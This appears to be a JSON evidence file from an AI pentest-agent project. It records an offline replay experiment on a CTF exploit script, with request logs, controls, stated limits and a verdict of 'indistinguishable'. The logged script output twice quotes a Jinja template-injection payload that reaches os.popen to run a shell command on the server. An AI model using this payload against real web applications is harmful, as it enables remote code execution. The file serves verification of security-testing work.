@@ -1,0 +1,361 @@
+{
+  "cases": [
+    {
+      "expected_path_complete": true,
+      "final_read_status": 200,
+      "initial_state": {
+        "matching_write_will_update_page": true,
+        "page_origin": "absent",
+        "page_present": false
+      },
+      "name": "A_valid_write",
+      "page_origin_after_write": "new_page_from_matching_write",
+      "page_updated_by_matching_write": true,
+      "requests": [
+        {
+          "form_field_names": [],
+          "html_sha256": null,
+          "index": 0,
+          "method": "GET",
+          "nonce_matches_session": null,
+          "page_present_before": false,
+          "page_updated": false,
+          "path": "/",
+          "route_matches_page": null,
+          "status": 200
+        },
+        {
+          "form_field_names": [
+            "name",
+            "password"
+          ],
+          "html_sha256": null,
+          "index": 1,
+          "method": "POST",
+          "nonce_matches_session": null,
+          "page_present_before": false,
+          "page_updated": false,
+          "path": "/admin",
+          "route_matches_page": null,
+          "status": 302
+        },
+        {
+          "form_field_names": [],
+          "html_sha256": null,
+          "index": 2,
+          "method": "GET",
+          "nonce_matches_session": null,
+          "page_present_before": false,
+          "page_updated": false,
+          "path": "/admin/pages",
+          "route_matches_page": null,
+          "status": 200
+        },
+        {
+          "form_field_names": [
+            "html",
+            "nonce",
+            "route"
+          ],
+          "html_sha256": "f28737c8adf9dde22f3c3bdc9b245c3eaeeea439cde86b2ae3d153d1f715be46",
+          "index": 3,
+          "method": "POST",
+          "nonce_matches_session": true,
+          "page_present_before": false,
+          "page_updated": true,
+          "path": "/admin/pages/flagchk",
+          "route_matches_page": true,
+          "status": 302
+        },
+        {
+          "form_field_names": [],
+          "html_sha256": null,
+          "index": 4,
+          "method": "GET",
+          "nonce_matches_session": null,
+          "page_present_before": true,
+          "page_updated": false,
+          "path": "/flagchk",
+          "route_matches_page": null,
+          "status": 200
+        }
+      ],
+      "script_return": 0,
+      "script_stderr": "[+] step1: GET / -> 200, session=offline-session\n[+] step2: POST /admin -> 302 -> /admin/graphs (no nonce needed)\n[+] step3: GET /admin/pages -> 200, nonce=aaaaaaaaaaaaaaaa...\n[+] step4: POST /admin/pages/flagchk -> 302 (payload: {{ config.__class__.__init__.__globals__['os'].popen('grep -n \"flag{\" /root/throwback/CTFd/admin.py').read() }})\n",
+      "script_stdout": "FLAG: flag{offline_marker}\n",
+      "write_response_status": 302
+    },
+    {
+      "expected_path_complete": true,
+      "final_read_status": 200,
+      "initial_state": {
+        "matching_write_will_update_page": false,
+        "page_origin": "old_page",
+        "page_present": true
+      },
+      "name": "B_stale_page",
+      "page_origin_after_write": "old_page",
+      "page_updated_by_matching_write": false,
+      "requests": [
+        {
+          "form_field_names": [],
+          "html_sha256": null,
+          "index": 0,
+          "method": "GET",
+          "nonce_matches_session": null,
+          "page_present_before": true,
+          "page_updated": false,
+          "path": "/",
+          "route_matches_page": null,
+          "status": 200
+        },
+        {
+          "form_field_names": [
+            "name",
+            "password"
+          ],
+          "html_sha256": null,
+          "index": 1,
+          "method": "POST",
+          "nonce_matches_session": null,
+          "page_present_before": true,
+          "page_updated": false,
+          "path": "/admin",
+          "route_matches_page": null,
+          "status": 302
+        },
+        {
+          "form_field_names": [],
+          "html_sha256": null,
+          "index": 2,
+          "method": "GET",
+          "nonce_matches_session": null,
+          "page_present_before": true,
+          "page_updated": false,
+          "path": "/admin/pages",
+          "route_matches_page": null,
+          "status": 200
+        },
+        {
+          "form_field_names": [
+            "html",
+            "nonce",
+            "route"
+          ],
+          "html_sha256": "f28737c8adf9dde22f3c3bdc9b245c3eaeeea439cde86b2ae3d153d1f715be46",
+          "index": 3,
+          "method": "POST",
+          "nonce_matches_session": true,
+          "page_present_before": true,
+          "page_updated": false,
+          "path": "/admin/pages/flagchk",
+          "route_matches_page": true,
+          "status": 302
+        },
+        {
+          "form_field_names": [],
+          "html_sha256": null,
+          "index": 4,
+          "method": "GET",
+          "nonce_matches_session": null,
+          "page_present_before": true,
+          "page_updated": false,
+          "path": "/flagchk",
+          "route_matches_page": null,
+          "status": 200
+        }
+      ],
+      "script_return": 0,
+      "script_stderr": "[+] step1: GET / -> 200, session=offline-session\n[+] step2: POST /admin -> 302 -> /admin/graphs (no nonce needed)\n[+] step3: GET /admin/pages -> 200, nonce=aaaaaaaaaaaaaaaa...\n[+] step4: POST /admin/pages/flagchk -> 302 (payload: {{ config.__class__.__init__.__globals__['os'].popen('grep -n \"flag{\" /root/throwback/CTFd/admin.py').read() }})\n",
+      "script_stdout": "FLAG: flag{offline_marker}\n",
+      "write_response_status": 302
+    }
+  ],
+  "conclusion": "In this explicit offline condition, the unchanged replay.py returned 0 and printed the same marker after an old page was read despite the matching write returning 302 and not changing the page. The script did not distinguish a new page produced by this write from stale old content. This does not establish that r5 actually encountered stale content.",
+  "controls": {
+    "case_a_valid": true,
+    "case_b_same_success": true,
+    "case_b_valid": true,
+    "request_signatures": [
+      [
+        {
+          "form_field_names": [],
+          "html_sha256": null,
+          "method": "GET",
+          "nonce_matches_session": null,
+          "path": "/",
+          "route_matches_page": null,
+          "status": 200
+        },
+        {
+          "form_field_names": [
+            "name",
+            "password"
+          ],
+          "html_sha256": null,
+          "method": "POST",
+          "nonce_matches_session": null,
+          "path": "/admin",
+          "route_matches_page": null,
+          "status": 302
+        },
+        {
+          "form_field_names": [],
+          "html_sha256": null,
+          "method": "GET",
+          "nonce_matches_session": null,
+          "path": "/admin/pages",
+          "route_matches_page": null,
+          "status": 200
+        },
+        {
+          "form_field_names": [
+            "html",
+            "nonce",
+            "route"
+          ],
+          "html_sha256": "f28737c8adf9dde22f3c3bdc9b245c3eaeeea439cde86b2ae3d153d1f715be46",
+          "method": "POST",
+          "nonce_matches_session": true,
+          "path": "/admin/pages/flagchk",
+          "route_matches_page": true,
+          "status": 302
+        },
+        {
+          "form_field_names": [],
+          "html_sha256": null,
+          "method": "GET",
+          "nonce_matches_session": null,
+          "path": "/flagchk",
+          "route_matches_page": null,
+          "status": 200
+        }
+      ],
+      [
+        {
+          "form_field_names": [],
+          "html_sha256": null,
+          "method": "GET",
+          "nonce_matches_session": null,
+          "path": "/",
+          "route_matches_page": null,
+          "status": 200
+        },
+        {
+          "form_field_names": [
+            "name",
+            "password"
+          ],
+          "html_sha256": null,
+          "method": "POST",
+          "nonce_matches_session": null,
+          "path": "/admin",
+          "route_matches_page": null,
+          "status": 302
+        },
+        {
+          "form_field_names": [],
+          "html_sha256": null,
+          "method": "GET",
+          "nonce_matches_session": null,
+          "path": "/admin/pages",
+          "route_matches_page": null,
+          "status": 200
+        },
+        {
+          "form_field_names": [
+            "html",
+            "nonce",
+            "route"
+          ],
+          "html_sha256": "f28737c8adf9dde22f3c3bdc9b245c3eaeeea439cde86b2ae3d153d1f715be46",
+          "method": "POST",
+          "nonce_matches_session": true,
+          "path": "/admin/pages/flagchk",
+          "route_matches_page": true,
+          "status": 302
+        },
+        {
+          "form_field_names": [],
+          "html_sha256": null,
+          "method": "GET",
+          "nonce_matches_session": null,
+          "path": "/flagchk",
+          "route_matches_page": null,
+          "status": 200
+        }
+      ]
+    ],
+    "requests_only_differ_by_state": true
+  },
+  "date": "2026-10-27",
+  "documents": [
+    {
+      "path": "AGENTS.md",
+      "sha256": "18e66730d5c40207e00704fb3fb760785ee547e66c23e97e5adfb897030dc83c",
+      "size": 7317
+    },
+    {
+      "path": "CLAUDE.md",
+      "sha256": "ea0e5935fa61a6e6f02ed34a02cfad94d659d32707683cf7eb1e470783580854",
+      "size": 5120
+    },
+    {
+      "path": "docs/superpowers/plans/2026-10-27-d-replay-stale-page-verification.md",
+      "sha256": "f88f2a7e53be2b8cff1433a3a09c5114a3d7d85c63676f4be6323aaaecc768db",
+      "size": 9188
+    },
+    {
+      "path": "docs/superpowers/specs/2026-10-26-design-v1-d-evidence-to-completion.md",
+      "sha256": "6a634c9294d23928d49d386ebe44cac86bca44c338d73eb01212a7fcd17a8c46",
+      "size": 19491
+    },
+    {
+      "note": "this evidence file; hash intentionally omitted because self-hashing is unstable",
+      "path": "docs/gates/d-artifact-handoff-20261024/replay-stale-page-20261027.json"
+    }
+  ],
+  "experiment": "d-replay-stale-page-verification",
+  "limits": [
+    "This is a simulated HTTP boundary, not the Throwback service implementation.",
+    "This does not prove that r5 read an old page or that the target had this fault.",
+    "This does not decide replay permissions, schema, outside-package binding, verified, or solved.",
+    "The synthetic marker is not the historical candidate and no private oracle was read.",
+    "The original r5 report remains verified/replay only on the model side; host effective judgment remains inconclusive."
+  ],
+  "offline_driver": {
+    "check_py_sha256": "c3bcafe6be01931a11f665baf10b64cf6c183184e60b73f7f34d0307487fdb5c",
+    "command": "python3 runs/d-replay-stale-page-verification/check.py",
+    "exit_code": 0,
+    "network_attempts": [],
+    "network_guard": {
+      "attempts": [],
+      "create_connection": true,
+      "socket_connect": true,
+      "socket_connect_ex": true
+    },
+    "result_json_sha256": "ad95579b539a2885a68501109cc03128f77997fed232cbbd614b2c41bd8c84a0",
+    "run_directory": "/Users/caihaoming/.codex/worktrees/d-replay-stale-page-verification/pentest-agent/runs/d-replay-stale-page-verification",
+    "simulated_base": "http://offline.invalid",
+    "temporary_workspace": "/Users/caihaoming/.codex/worktrees/d-replay-stale-page-verification/pentest-agent",
+    "usage": "unavailable"
+  },
+  "product_head": "6fa6c6621464bcdd11ac618fa930b7d1bdbe9bbd",
+  "purpose": "Determine whether the hash-bound r5 package replay.py can distinguish a page newly created by the matching write from stale old page content, with only the HTTP boundary replaced offline.",
+  "python": "3.13.10 (v3.13.10:4fd884356d7, Dec  2 2025, 09:31:05) [Clang 16.0.0 (clang-1600.0.26.6)]",
+  "source": {
+    "copy_unchanged": true,
+    "historical_report_unchanged_by_experiment": true,
+    "preparation": "77016744-85ab-47ac-8973-b1d553d59691",
+    "report": "0063135b-b061-419c-8000-51cff36d601a",
+    "run": "throwback-debug-20261027-r5-1",
+    "script_path_in_preparation": "replay.py",
+    "script_sha256": "d1f7d54b18d69a7d288ad01e9cd015e737cbfcb1db1a3669c263fb14615084df",
+    "script_size": 6371,
+    "script_unchanged": true,
+    "verifier_execution": "6cd43d83-dd02-4eaa-a0de-1a9aed8e40ee",
+    "version": "f0a80e86-ab0f-4495-9bcf-8e17a934f1a1"
+  },
+  "timezone": "Asia/Tokyo",
+  "verdict": "indistinguishable"
+}
